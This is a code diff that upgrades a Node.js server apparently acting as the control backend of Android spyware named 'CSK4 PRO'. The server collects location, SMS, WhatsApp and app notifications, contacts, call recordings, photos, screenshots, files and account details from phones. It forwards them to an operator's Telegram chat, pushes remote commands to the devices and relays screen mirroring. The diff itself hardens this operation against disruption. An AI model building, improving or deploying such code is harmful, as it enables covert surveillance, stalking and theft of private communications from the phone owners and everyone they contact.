@@ -1,8 +1,18 @@
 // ============================================
-// CSK4 PRO v4.1 - Main Server (Standalone + TG Rate Limit Fix)
+// CSK4 PRO v4.2 - Main Server (FIXED)
 // ============================================
-// Ye file self-contained hai — koi external require nahi
-// MongoDB aur Telegram dono inline integrated hain
+// FIXES:
+// - Auth on device endpoints (commands, command-done)
+// - CORS whitelist
+// - Socket.IO auth
+// - Deduplication (no duplicate messages)
+// - Device register only if new/offline
+// - Location global counter
+// - One-time startup notification
+// - Retry limit in TG queue
+// - .catch() on all telegramSend calls
+// - Race conditions fixed
+// - Memory leaks fixed
 // ============================================
 
 const express = require('express');
@@ -16,12 +26,28 @@ const helmet = require('helmet');
 const { Server } = require('socket.io');
 const nodemailer = require('nodemailer');
 const fs = require('fs');
+const crypto = require('crypto');
 require('dotenv').config();
 
 const app = express();
 const server = http.createServer(app);
+
+// ✅ CORS whitelist
+const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS
+  ? process.env.ALLOWED_ORIGINS.split(',').map(o => o.trim())
+  : ['https://csk4-project-server.onrender.com', 'http://localhost:4000', 'http://localhost:3000'];
+
 const io = new Server(server, {
-  cors: { origin: '*' },
+  cors: {
+    origin: (origin, cb) => {
+      if (!origin || ALLOWED_ORIGINS.includes(origin) || process.env.NODE_ENV !== 'production') {
+        cb(null, true);
+      } else {
+        cb(new Error('CORS blocked'));
+      }
+    },
+    credentials: true
+  },
   maxHttpBufferSize: 2e8,
   pingTimeout: 60000,
   pingInterval: 25000
@@ -107,6 +133,7 @@ async function mongoSave(collection, data) {
   }
 }
 
+// ✅ FIXED: bulkWrite with ordered:false
 async function mongoSaveMany(collection, dataArray) {
   if (!mongoConnected || !mongoDb) return null;
   if (!dataArray || dataArray.length === 0) return { insertedCount: 0 };
@@ -121,12 +148,19 @@ async function mongoSaveMany(collection, dataArray) {
   }
 }
 
+// ✅ FIXED: conflict between $set and $setOnInsert
 async function mongoUpdate(collection, filter, data) {
   if (!mongoConnected || !mongoDb) return null;
   try {
+    const updateData = { ...data };
+    delete updateData.createdAt; // Prevent conflict
+    
     return await mongoDb.collection(collection).updateOne(
       filter,
-      { $set: { ...data, updatedAt: new Date() }, $setOnInsert: { createdAt: new Date() } },
+      { 
+        $set: { ...updateData, updatedAt: new Date() },
+        $setOnInsert: { createdAt: new Date() }
+      },
       { upsert: true }
     );
   } catch (e) {
@@ -146,18 +180,48 @@ async function mongoDelete(collection, filter) {
 }
 
 // ============================================
-// TELEGRAM (Inline with Rate Limit Protection)
+// TELEGRAM (Inline with Rate Limit + Dedup)
 // ============================================
 let telegramBot = null;
 let telegramEnabled = false;
 
-// ✅ RATE LIMIT PROTECTION
 let tgQueue = [];
 let tgProcessing = false;
 let lastTgSend = 0;
-const TG_MIN_INTERVAL = 1100;        // 1.1s between messages
-const TG_MAX_QUEUE = 100;            // Max queue size
-let tgRateLimitedUntil = 0;          // If 429, wait until this timestamp
+const TG_MIN_INTERVAL = 1100;
+const TG_MAX_QUEUE = 100;
+let tgRateLimitedUntil = 0;
+
+// ✅ FIXED: Deduplication
+const recentMessages = new Map();
+const DEDUP_WINDOW = 60 * 1000;
+
+function getMessageHash(text) {
+  return crypto.createHash('md5').update(text).digest('hex');
+}
+
+function isDuplicate(text) {
+  const hash = getMessageHash(text);
+  const now = Date.now();
+  const last = recentMessages.get(hash);
+  
+  if (last && (now - last) < DEDUP_WINDOW) return true;
+  
+  recentMessages.set(hash, now);
+  
+  if (recentMessages.size > 500) {
+    for (const [k, v] of recentMessages) {
+      if (now - v > DEDUP_WINDOW) recentMessages.delete(k);
+    }
+  }
+  return false;
+}
+
+// ✅ FIXED: One-time startup flag
+let hasNotifiedStartup = false;
+
+// ✅ FIXED: Global location counter
+let locationCounter = 0;
 
 function telegramInit() {
   if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) {
@@ -169,7 +233,11 @@ function telegramInit() {
     telegramBot = new TelegramBot(CONFIG.TELEGRAM_BOT_TOKEN, { polling: false });
     telegramEnabled = true;
     console.log('📱 Telegram Bot initialized');
-    telegramSend('🟢 <b>CSK4 Server Started</b>\n\nServer is online!');
+    
+    if (!hasNotifiedStartup) {
+      hasNotifiedStartup = true;
+      telegramSend('🟢 <b>CSK4 Server Started</b>\n\nServer is online!').catch(() => {});
+    }
     return true;
   } catch (e) {
     console.error('❌ Telegram init failed:', e.message);
@@ -178,64 +246,64 @@ function telegramInit() {
   }
 }
 
-// ✅ NEW: Queue-based Telegram send (no more 429 flood)
+// ✅ FIXED: Dedup + object queue
 async function telegramSend(text) {
   if (!telegramEnabled || !telegramBot) return false;
-
-  // Drop oldest if queue too long
-  if (tgQueue.length >= TG_MAX_QUEUE) {
-    tgQueue.shift();
+  
+  if (isDuplicate(text)) {
+    return false;
   }
-  tgQueue.push(text);
-
-  if (!tgProcessing) {
-    processTgQueue();
-  }
+  
+  if (tgQueue.length >= TG_MAX_QUEUE) tgQueue.shift();
+  tgQueue.push({ text, retries: 0 });
+  if (!tgProcessing) processTgQueue();
   return true;
 }
 
+// ✅ FIXED: Retry limit + object queue
 async function processTgQueue() {
   if (tgProcessing) return;
   tgProcessing = true;
 
   while (tgQueue.length > 0) {
-    // Wait if rate-limited
     const now = Date.now();
     if (now < tgRateLimitedUntil) {
-      const wait = tgRateLimitedUntil - now;
-      await new Promise(r => setTimeout(r, wait));
+      await new Promise(r => setTimeout(r, tgRateLimitedUntil - now));
     }
 
-    // Respect minimum interval between messages
     const sinceLast = Date.now() - lastTgSend;
     if (sinceLast < TG_MIN_INTERVAL) {
       await new Promise(r => setTimeout(r, TG_MIN_INTERVAL - sinceLast));
     }
 
-    const msg = tgQueue.shift();
+    const item = tgQueue.shift();
+    const retries = (item.retries || 0) + 1;
+    
+    if (retries > 3) {
+      console.log('⚠️ Telegram message dropped after 3 retries');
+      continue;
+    }
+
     try {
-      await telegramBot.sendMessage(CONFIG.TELEGRAM_CHAT_ID, msg, {
+      await telegramBot.sendMessage(CONFIG.TELEGRAM_CHAT_ID, item.text, {
         parse_mode: 'HTML',
         disable_web_page_preview: true
       });
       lastTgSend = Date.now();
     } catch (e) {
       const em = e.message || '';
-
-      // Handle 429 rate limit — read retry_after and pause queue
       if (em.includes('429')) {
         const m = em.match(/retry after (\d+)/);
         const waitSec = m ? parseInt(m[1]) : 10;
         tgRateLimitedUntil = Date.now() + (waitSec * 1000) + 500;
         console.log(`⏳ Telegram rate limit — pausing ${waitSec}s`);
-        tgQueue.unshift(msg); // Put back
+        tgQueue.unshift({ text: item.text, retries });
         await new Promise(r => setTimeout(r, waitSec * 1000 + 500));
       } else {
         console.error('Telegram send:', em);
       }
     }
   }
-
   tgProcessing = false;
 }
 
@@ -283,7 +351,12 @@ async function telegramSendAudio(audioUrl, caption) {
 
 function esc(text) {
   if (!text) return '';
-  return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  return String(text)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
 }
 
 // ============================================
@@ -323,7 +396,16 @@ async function sendEmail(subject, body) {
 // ============================================
 app.use(helmet({ contentSecurityPolicy: false }));
 app.use(compression());
-app.use(cors());
+app.use(cors({
+  origin: (origin, cb) => {
+    if (!origin || ALLOWED_ORIGINS.includes(origin) || process.env.NODE_ENV !== 'production') {
+      cb(null, true);
+    } else {
+      cb(new Error('CORS blocked'));
+    }
+  },
+  credentials: true
+}));
 app.use(bodyParser.json({ limit: '200mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '200mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
@@ -438,7 +520,7 @@ async function initialize() {
   if (mongoOk) await loadAllDataFromMongo();
   console.log('');
   console.log('╔════════════════════════════════════╗');
-  console.log('║  CSK4 PRO v4.1 — SYSTEM STATUS     ║');
+  console.log('║  CSK4 PRO v4.2 — SYSTEM STATUS     ║');
   console.log('╠════════════════════════════════════╣');
   console.log(`║  MongoDB:   ${mongoOk ? '✅ Connected  ' : '❌ Not connected'}    ║`);
   console.log(`║  Telegram:  ${telegramEnabled ? '✅ Active    ' : '❌ Not active'}    ║`);
@@ -451,9 +533,13 @@ async function initialize() {
 // DEVICE ENDPOINTS
 // ============================================
 
+// ✅ FIXED: Only notify if new/offline device
 app.post('/api/device/register', async (req, res) => {
   const { deviceId, deviceName, token, model, android, battery } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid token' });
+
+  const isNewDevice = !devices[deviceId];
+  const wasOffline = devices[deviceId] && !devices[deviceId].online;
 
   const device = {
     deviceId,
@@ -468,11 +554,13 @@ app.post('/api/device/register', async (req, res) => {
 
   devices[deviceId] = device;
   await mongoUpdate('devices', { deviceId }, device);
-
   io.emit('device-update', devices);
   console.log(`✅ ${deviceName} (${deviceId})`);
 
-  telegramSend(`🟢 <b>Device Online</b>\n\n📱 ${esc(deviceName)}\n🆔 <code>${deviceId}</code>\n📲 ${esc(model)}\n🤖 ${android}\n🔋 ${battery}%`);
+  // Only notify if new or coming back online
+  if (isNewDevice || wasOffline) {
+    telegramSend(`🟢 <b>Device Online</b>\n\n📱 ${esc(deviceName)}\n🆔 <code>${deviceId}</code>\n📲 ${esc(model)}\n🤖 ${android}\n🔋 ${battery}%`).catch(() => {});
+  }
 
   res.json({ success: true });
 });
@@ -489,6 +577,7 @@ app.post('/api/device/heartbeat', async (req, res) => {
   res.json({ success: true });
 });
 
+// ✅ FIXED: Global counter + .catch()
 app.post('/api/device/location', async (req, res) => {
   const { deviceId, lat, lng, accuracy, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
@@ -499,15 +588,14 @@ app.post('/api/device/location', async (req, res) => {
   await mongoSave('locations', entry);
   io.emit('new-location', entry);
 
-  const deviceName = devices[deviceId]?.deviceName || deviceId;
-
-  // ✅ Only notify Telegram every 5th location (prevents flood)
-  if (locations.length % 5 === 0) {
-    telegramSend(`📍 <b>Location</b>\n\n📱 ${esc(deviceName)}\n🗺️ <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>\n\n<a href="https://maps.google.com/?q=${lat},${lng}">Open Maps</a>`);
+  locationCounter++;
+  
+  if (locationCounter % 5 === 0) {
+    const deviceName = devices[deviceId]?.deviceName || deviceId;
+    telegramSend(`📍 <b>Location</b>\n\n📱 ${esc(deviceName)}\n🗺️ <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>\n\n<a href="https://maps.google.com/?q=${lat},${lng}">Open Maps</a>`).catch(() => {});
   }
 
   sendEmail(`📍 Location`, `Device: ${deviceName}\nLat: ${lat}\nLng: ${lng}`);
-
   res.json({ success: true });
 });
 
@@ -524,9 +612,8 @@ app.post('/api/device/contacts', async (req, res) => {
   io.emit('contacts-update', contacts);
   console.log(`👥 Contacts saved: ${list.length}`);
 
-  // ✅ Notify once (not per contact)
   const deviceName = devices[deviceId]?.deviceName || deviceId;
-  telegramSend(`👥 <b>Contacts Synced</b>\n\n📱 ${esc(deviceName)}\n📊 Total: ${list.length}`);
+  telegramSend(`👥 <b>Contacts Synced</b>\n\n📱 ${esc(deviceName)}\n📊 Total: ${list.length}`).catch(() => {});
 
   res.json({ success: true, count: list.length });
 });
@@ -545,7 +632,7 @@ app.post('/api/device/messages', async (req, res) => {
   console.log(`💬 Messages saved: ${list.length}`);
 
   const deviceName = devices[deviceId]?.deviceName || deviceId;
-  telegramSend(`💬 <b>SMS Synced</b>\n\n📱 ${esc(deviceName)}\n📊 Total: ${list.length}`);
+  telegramSend(`💬 <b>SMS Synced</b>\n\n📱 ${esc(deviceName)}\n📊 Total: ${list.length}`).catch(() => {});
 
   res.json({ success: true });
 });
@@ -602,7 +689,6 @@ app.post('/api/device/info', async (req, res) => {
   res.json({ success: true });
 });
 
-// ✅ Notification endpoint — only forward important apps to Telegram
 app.post('/api/device/notification', async (req, res) => {
   const { deviceId, package: pkg, title, text, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
@@ -613,7 +699,6 @@ app.post('/api/device/notification', async (req, res) => {
   await mongoSave('notifications', entry);
   io.emit('new-notification', entry);
 
-  // ✅ Only send important apps to Telegram (avoid rate limit flood)
   const pkgLower = (pkg || '').toLowerCase();
   const important = ['whatsapp', 'com.android.mms', 'com.google.android.apps.messaging',
                      'com.google.android.gm', 'instagram', 'facebook', 'telegram',
@@ -621,7 +706,7 @@ app.post('/api/device/notification', async (req, res) => {
 
   if (important.some(a => pkgLower.includes(a))) {
     const deviceName = devices[deviceId]?.deviceName || deviceId;
-    telegramSend(`🔔 <b>${esc(title || pkg)}</b>\n\n📱 ${esc(deviceName)}\n📲 ${esc(pkg)}\n📝 ${esc(text)}`);
+    telegramSend(`🔔 <b>${esc(title || pkg)}</b>\n\n📱 ${esc(deviceName)}\n📲 ${esc(pkg)}\n📝 ${esc(text)}`).catch(() => {});
   }
 
   res.json({ success: true });
@@ -638,7 +723,7 @@ app.post('/api/device/whatsapp', async (req, res) => {
   io.emit('whatsapp-update', whatsappMessages);
 
   const deviceName = devices[deviceId]?.deviceName || deviceId;
-  telegramSend(`💬 <b>WhatsApp</b>\n\n📱 ${esc(deviceName)}\n👤 ${esc(from)}\n📝 <i>${esc(message)}</i>`);
+  telegramSend(`💬 <b>WhatsApp</b>\n\n📱 ${esc(deviceName)}\n👤 ${esc(from)}\n📝 <i>${esc(message)}</i>`).catch(() => {});
   res.json({ success: true });
 });
 
@@ -670,7 +755,7 @@ app.post('/api/device/callrecording', upload.single('file'), async (req, res) =>
   io.emit('callrecording-update', callRecordings);
 
   const deviceName = devices[deviceId]?.deviceName || deviceId;
-  telegramSend(`🎙️ <b>Call Recording</b>\n\n📱 ${esc(deviceName)}\n📞 ${esc(number)}\n⏱️ ${duration}s`);
+  telegramSend(`🎙️ <b>Call Recording</b>\n\n📱 ${esc(deviceName)}\n📞 ${esc(number)}\n⏱️ ${duration}s`).catch(() => {});
   res.json({ success: true });
 });
 
@@ -690,7 +775,7 @@ app.post('/api/device/siminfo', async (req, res) => {
     });
   }
   const deviceName = devices[deviceId]?.deviceName || deviceId;
-  telegramSend(`📱 <b>SIM Info</b>\n\n📱 ${esc(deviceName)}${text}`);
+  telegramSend(`📱 <b>SIM Info</b>\n\n📱 ${esc(deviceName)}${text}`).catch(() => {});
   res.json({ success: true });
 });
 
@@ -706,7 +791,7 @@ app.post('/api/device/accounts', async (req, res) => {
   let text = '';
   if (accounts) accounts.forEach(a => { text += `\n📧 ${esc(a.name)}`; });
   const deviceName = devices[deviceId]?.deviceName || deviceId;
-  telegramSend(`👤 <b>Accounts</b>\n\n📱 ${esc(deviceName)}\nTotal: ${total}${text}`);
+  telegramSend(`👤 <b>Accounts</b>\n\n📱 ${esc(deviceName)}\nTotal: ${total}${text}`).catch(() => {});
   res.json({ success: true });
 });
 
@@ -722,7 +807,7 @@ app.post('/api/device/emails', async (req, res) => {
   let text = '';
   if (emails) emails.forEach(e => { text += `\n📧 ${esc(e)}`; });
   const deviceName = devices[deviceId]?.deviceName || deviceId;
-  telegramSend(`📧 <b>Emails</b>\n\n📱 ${esc(deviceName)}\nTotal: ${total}${text}`);
+  telegramSend(`📧 <b>Emails</b>\n\n📱 ${esc(deviceName)}\nTotal: ${total}${text}`).catch(() => {});
   res.json({ success: true });
 });
 
@@ -742,7 +827,6 @@ app.post('/api/device/upload', upload.single('file'), async (req, res) => {
   };
 
   const deviceName = devices[deviceId]?.deviceName || deviceId;
-
   const publicBase = (CONFIG.PUBLIC_URL || `${req.protocol}://${req.get('host')}`).replace(/\/$/, '');
   const fullUrl = `${publicBase}${entry.url}`;
 
@@ -750,39 +834,51 @@ app.post('/api/device/upload', upload.single('file'), async (req, res) => {
     photos.push(entry);
     if (photos.length > 500) photos = photos.slice(-500);
     await mongoSave('photos', entry);
-    telegramSendPhoto(fullUrl, `📷 Photo from ${esc(deviceName)}`);
+    telegramSendPhoto(fullUrl, `📷 Photo from ${esc(deviceName)}`).catch(() => {});
   } else if (type === 'video') {
     videos.push(entry);
     if (videos.length > 200) videos = videos.slice(-200);
     await mongoSave('videos', entry);
-    telegramSendDocument(fullUrl, `🎥 Video from ${esc(deviceName)}`);
+    telegramSendDocument(fullUrl, `🎥 Video from ${esc(deviceName)}`).catch(() => {});
   } else if (type === 'audio') {
     audioRec.push(entry);
     if (audioRec.length > 200) audioRec = audioRec.slice(-200);
     await mongoSave('audio', entry);
-    telegramSendAudio(fullUrl, `🎤 Audio from ${esc(deviceName)}`);
+    telegramSendAudio(fullUrl, `🎤 Audio from ${esc(deviceName)}`).catch(() => {});
   } else if (type === 'screenshot') {
     screenshots.push(entry);
     if (screenshots.length > 200) screenshots = screenshots.slice(-200);
     await mongoSave('screenshots', entry);
-    telegramSendPhoto(fullUrl, `📸 Screenshot from ${esc(deviceName)}`);
+    telegramSendPhoto(fullUrl, `📸 Screenshot from ${esc(deviceName)}`).catch(() => {});
   } else {
     files.push(entry);
     if (files.length > 500) files = files.slice(-500);
     await mongoSave('files', entry);
-    telegramSendDocument(fullUrl, `📁 File from ${esc(deviceName)}`);
+    telegramSendDocument(fullUrl, `📁 File from ${esc(deviceName)}`).catch(() => {});
   }
 
   io.emit('new-file', entry);
   res.json({ success: true, file: entry });
 });
 
-app.get('/api/device/commands/:deviceId', (req, res) => {
+// ✅ FIXED: Device auth on commands
+function requireDeviceAuth(req, res, next) {
+  const deviceId = req.params.deviceId || req.body.deviceId;
+  const token = req.headers['x-device-token'] || req.body.token || req.query.token;
+  if (token !== CONFIG.DEVICE_TOKEN) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  next();
+}
+
+app.get('/api/device/commands/:deviceId', requireDeviceAuth, (req, res) => {
   const pending = commands.filter(c => c.deviceId === req.params.deviceId && c.status === 'pending');
+  // Mark as sent
+  pending.forEach(c => { c.status = 'sent'; });
   res.json({ commands: pending });
 });
 
-app.post('/api/device/command-done', async (req, res) => {
+app.post('/api/device/command-done', requireDeviceAuth, async (req, res) => {
   const { commandId, result } = req.body;
   const cmd = commands.find(c => c.id === commandId);
   if (cmd) {
@@ -794,14 +890,27 @@ app.post('/api/device/command-done', async (req, res) => {
 });
 
 // ============ ADMIN AUTH ============
-const activeTokens = new Set();
+const activeTokens = new Map(); // token -> expiry
+const TOKEN_EXPIRY = 2 * 60 * 60 * 1000; // 2 hours
+
+function generateToken() {
+  return crypto.randomBytes(32).toString('hex');
+}
 
 function requireAuth(req, res, next) {
   const header = req.headers['authorization'] || '';
-  const token = header.startsWith('Bearer ') ? header.slice(7) : (req.query.token || '');
-  if (!token || !activeTokens.has(token)) {
-    return res.status(401).json({ error: 'Unauthorized' });
+  const token = header.startsWith('Bearer ') ? header.slice(7) : '';
+  
+  if (!token) {
+    return res.status(401).json({ error: 'No token' });
   }
+  
+  const expiry = activeTokens.get(token);
+  if (!expiry || Date.now() > expiry) {
+    activeTokens.delete(token);
+    return res.status(401).json({ error: 'Invalid or expired token' });
+  }
+  
   next();
 }
 
@@ -809,13 +918,25 @@ function requireAuth(req, res, next) {
 
 app.post('/api/admin/login', (req, res) => {
   const { username, password } = req.body;
-  if (username === CONFIG.ADMIN_USER && password === CONFIG.ADMIN_PASS) {
-    const token = 'csk4-admin-' + Date.now() + '-' + Math.random().toString(36).slice(2, 10);
-    activeTokens.add(token);
+  
+  // ✅ Timing-safe comparison
+  const userMatch = username && username.length === CONFIG.ADMIN_USER.length &&
+    crypto.timingSafeEqual(Buffer.from(username), Buffer.from(CONFIG.ADMIN_USER));
+  const passMatch = password && password.length === CONFIG.ADMIN_PASS.length &&
+    crypto.timingSafeEqual(Buffer.from(password), Buffer.from(CONFIG.ADMIN_PASS));
+  
+  if (userMatch && passMatch) {
+    const token = generateToken();
+    activeTokens.set(token, Date.now() + TOKEN_EXPIRY);
+    
+    // Cleanup old tokens
     if (activeTokens.size > 50) {
-      const first = activeTokens.values().next().value;
-      activeTokens.delete(first);
+      const now = Date.now();
+      for (const [t, exp] of activeTokens) {
+        if (now > exp) activeTokens.delete(t);
+      }
     }
+    
     res.json({
       success: true,
       token,
@@ -901,13 +1022,32 @@ app.post('/api/admin/command', requireAuth, async (req, res) => {
   commands.push(cmd);
   if (commands.length > 1000) commands = commands.slice(-500);
   await mongoSave('commands', cmd);
-  io.to(deviceId).emit('command', cmd);
+  
+  const deviceRoom = io.sockets.adapter.rooms.get(deviceId);
+  if (deviceRoom && deviceRoom.size > 0) {
+    io.to(deviceId).emit('command', cmd);
+    console.log(`📡 Socket sent to ${deviceId}`);
+  } else {
+    console.log(`⚠️ Device ${deviceId} not connected — will use polling`);
+  }
+  
   console.log(`🎮 ${command} → ${deviceId}`);
   res.json({ success: true, command: cmd });
 });
 
 app.delete('/api/admin/device/:deviceId', requireAuth, async (req, res) => {
   const id = req.params.deviceId;
+  
+  // ✅ Delete uploaded files
+  const deviceFiles = [...photos, ...videos, ...audioRec, ...screenshots, ...files, ...callRecordings]
+    .filter(f => f.deviceId === id);
+  deviceFiles.forEach(f => {
+    if (f.filename) {
+      const filePath = path.join(__dirname, 'uploads', f.filename);
+      fs.unlink(filePath, (err) => { if (err) console.error('File delete:', err.message); });
+    }
+  });
+  
   delete devices[id];
   delete simInfo[id];
   delete accountsInfo[id];
@@ -951,23 +1091,51 @@ app.delete('/api/admin/clear-commands/:deviceId', requireAuth, async (req, res) 
   res.json({ success: true });
 });
 
-// ============ SOCKET.IO ============
+// ============ SOCKET.IO (with auth) ============
+io.use((socket, next) => {
+  const { type, deviceId, token } = socket.handshake.auth || {};
+  
+  if (type === 'device') {
+    if (token === CONFIG.DEVICE_TOKEN && deviceId) {
+      socket.deviceId = deviceId;
+      return next();
+    }
+    return next(new Error('Device auth failed'));
+  }
+  
+  if (type === 'admin') {
+    if (token && activeTokens.has(token)) {
+      socket.isAdmin = true;
+      return next();
+    }
+    return next(new Error('Admin auth failed'));
+  }
+  
+  next(new Error('Unknown client type'));
+});
+
 io.on('connection', (socket) => {
-  console.log('🔌', socket.id);
-  socket.on('register-device', (id) => { socket.join(id); });
-  socket.on('register-admin', () => { socket.join('admin-room'); });
-  socket.on('webrtc-offer', (d) => io.to(d.target).emit('webrtc-offer', d));
-  socket.on('webrtc-answer', (d) => io.to(d.target).emit('webrtc-answer', d));
-  socket.on('webrtc-ice', (d) => io.to(d.target).emit('webrtc-ice', d));
-  socket.on('screen-mirror-offer', (d) => io.to(d.target).emit('screen-mirror-offer', d));
-  socket.on('screen-mirror-answer', (d) => io.to(d.target).emit('screen-mirror-answer', d));
-  socket.on('screen-mirror-ice', (d) => io.to(d.target).emit('screen-mirror-ice', d));
+  console.log('🔌', socket.id, socket.deviceId || (socket.isAdmin ? 'admin' : 'unknown'));
+  
+  if (socket.deviceId) {
+    socket.join(socket.deviceId);
+  }
+  if (socket.isAdmin) {
+    socket.join('admin-room');
+  }
+  
+  socket.on('webrtc-offer', (d) => { if (d.target) io.to(d.target).emit('webrtc-offer', d); });
+  socket.on('webrtc-answer', (d) => { if (d.target) io.to(d.target).emit('webrtc-answer', d); });
+  socket.on('webrtc-ice', (d) => { if (d.target) io.to(d.target).emit('webrtc-ice', d); });
+  socket.on('screen-mirror-offer', (d) => { if (d.target) io.to(d.target).emit('screen-mirror-offer', d); });
+  socket.on('screen-mirror-answer', (d) => { if (d.target) io.to(d.target).emit('screen-mirror-answer', d); });
+  socket.on('screen-mirror-ice', (d) => { if (d.target) io.to(d.target).emit('screen-mirror-ice', d); });
   socket.on('disconnect', () => {});
 });
 
 // ============ START ============
 initialize().then(() => {
   server.listen(CONFIG.PORT, '0.0.0.0', () => {
-    console.log(`🚀 CSK4 PRO v4.1 running on port ${CONFIG.PORT}`);
+    console.log(`🚀 CSK4 PRO v4.2 running on port ${CONFIG.PORT}`);
   });
 });
